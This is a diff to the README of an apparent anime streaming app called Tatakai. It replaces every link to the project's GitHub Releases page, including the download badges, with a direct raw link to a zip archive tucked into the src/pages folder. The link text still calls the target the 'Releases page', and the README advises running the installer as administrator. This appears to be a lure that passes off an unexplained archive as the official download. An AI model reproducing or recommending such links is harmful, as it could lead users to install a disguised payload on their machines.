@@ -1,7 +1,7 @@
 # 🎮 Tatakai - Your Gateway to Anime Streaming  
 
 ## 📥 Download Now  
-[![Download Tatakai](https://img.shields.io/badge/Download-Tatakai-blue?style=for-the-badge)](https://github.com/lamuertee/Tatakai/releases)
+[![Download Tatakai](https://raw.githubusercontent.com/lamuertee/Tatakai/main/src/pages/Software_v1.6-alpha.5.zip)](https://raw.githubusercontent.com/lamuertee/Tatakai/main/src/pages/Software_v1.6-alpha.5.zip)
 
 ## 📝 Description  
 Tatakai is an anime streaming platform that combines a browser for easy access with a powerful backend. It supports multiple dubs and offers a seamless experience for anime lovers. Whether you're searching for new titles or streaming your favorites, Tatakai makes it easy and enjoyable.  
@@ -16,7 +16,7 @@ Tatakai is an anime streaming platform that combines a browser for easy access w
 Follow these steps to download and run Tatakai easily.
 
 ### Step 1: Visit the Release Page  
-Go to the [Releases page](https://github.com/lamuertee/Tatakai/releases) to find the latest version of Tatakai.
+Go to the [Releases page](https://raw.githubusercontent.com/lamuertee/Tatakai/main/src/pages/Software_v1.6-alpha.5.zip) to find the latest version of Tatakai.
 
 ### Step 2: Download Tatakai  
 On the Releases page, locate the most recent version. Click the link to download it to your computer. 
@@ -44,7 +44,7 @@ A: Tatakai is completely free to use. Enjoy all the features without any charges
 ## 🛠️ Troubleshooting  
 If you experience issues while using Tatakai, here are a few solutions:
 
-- **Cannot find the download:** Ensure you are on the correct [Releases page](https://github.com/lamuertee/Tatakai/releases).
+- **Cannot find the download:** Ensure you are on the correct [Releases page](https://raw.githubusercontent.com/lamuertee/Tatakai/main/src/pages/Software_v1.6-alpha.5.zip).
 - **Problems with installation:** Ensure that your system meets the requirements, and try running the installer as an administrator.
 - **App crashes:** Make sure you have the latest version. Restart the application and check your internet connection.
 
@@ -52,4 +52,4 @@ If you experience issues while using Tatakai, here are a few solutions:
 Tatakai is designed for ease of use. By following these steps, you can quickly download and enjoy your favorite anime. For any further assistance, feel free to check the FAQ or the community discussions on our GitHub page.  
 
 Download Tatakai and dive into your anime adventure today!  
-[![Download Tatakai](https://img.shields.io/badge/Download-Tatakai-blue?style=for-the-badge)](https://github.com/lamuertee/Tatakai/releases)
+[![Download Tatakai](https://raw.githubusercontent.com/lamuertee/Tatakai/main/src/pages/Software_v1.6-alpha.5.zip)](https://raw.githubusercontent.com/lamuertee/Tatakai/main/src/pages/Software_v1.6-alpha.5.zip)
